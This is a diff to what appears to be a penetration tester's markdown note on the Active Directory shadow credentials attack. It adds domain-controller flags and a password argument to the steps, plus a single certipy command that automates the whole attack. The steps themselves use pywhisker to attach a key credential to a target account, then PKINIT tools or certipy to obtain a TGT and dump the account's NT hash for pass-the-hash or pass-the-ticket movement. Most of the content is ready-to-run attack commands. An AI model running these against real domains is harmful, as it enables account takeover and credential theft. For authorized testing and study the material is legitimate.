@@ -559,7 +559,7 @@ Allows the user to create a shadow credential on a computer and authenticate as 
 
 1. Add a shadow credential (key pair) to the target account. `pywhisker` outputs a `.pfx` and its password:
 ```bash
-pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"
+pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add" --dc-ip DC_IP
 
 # Parameters:
 # -d: domain FQDN
@@ -568,23 +568,32 @@ pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target
 # --action add: create and attach the key credential (list / remove / clear also available)
 ```
 
+> [!Note]
+> If we get the `Invalid server address` error, use `--dc-ip DC_IP` flag
+
 2. Use the generated certificate to request a TGT via PKINIT and dump the target's NT hash:
 ```bash
 # PKINITtools
-python3 gettgtpkinit.py -cert-pfx target.pfx -pfx-pass <PFX_PASSWORD> "domain.local/targetAccount" target.ccache
+python3 gettgtpkinit.py -cert-pfx target.pfx -pfx-pass <PFX_PASSWORD> "domain.local/targetAccount" target.ccache -dc-ip DC_IP
+# copy the <AS-REP_KEY> 
 
 export KRB5CCNAME=target.ccache
 
-python3 getnthash.py -key <AS-REP_KEY> "domain.local/targetAccount"
+python3 getnthash.py -key <AS-REP_KEY> "domain.local/targetAccount" -dc-ip DC_IP
 
 # Or, in one step with certipy:
-certipy-ad auth -pfx target.pfx -username targetAccount -domain domain.local -dc-ip <DC_IP>
+certipy-ad auth -pfx target.pfx -password PFX_PASS -username targetAccount -domain domain.local -dc-ip <DC_IP>
 ```
 
 3. Reuse the recovered TGT/NT hash for [[Pass the Ticket (PtT)]] or [[Pass the Hash (PtH)]] lateral movement.
 
 > [!Note]
 > Clean up afterwards with `--action clear` (or `remove`) to delete the shadow credential you added to `msDS-KeyCredentialLink`.
+
+Automate everything with a single command (recommended):
+```bash
+$ certipy-ad shadow auto -u CONTROLLED_USER@DOMAIN_FQDN -p "PASSWORD" -account TARGET_ACCOUNT -dc-ip DC_IP -debug
+```
 
 **Windows**
 
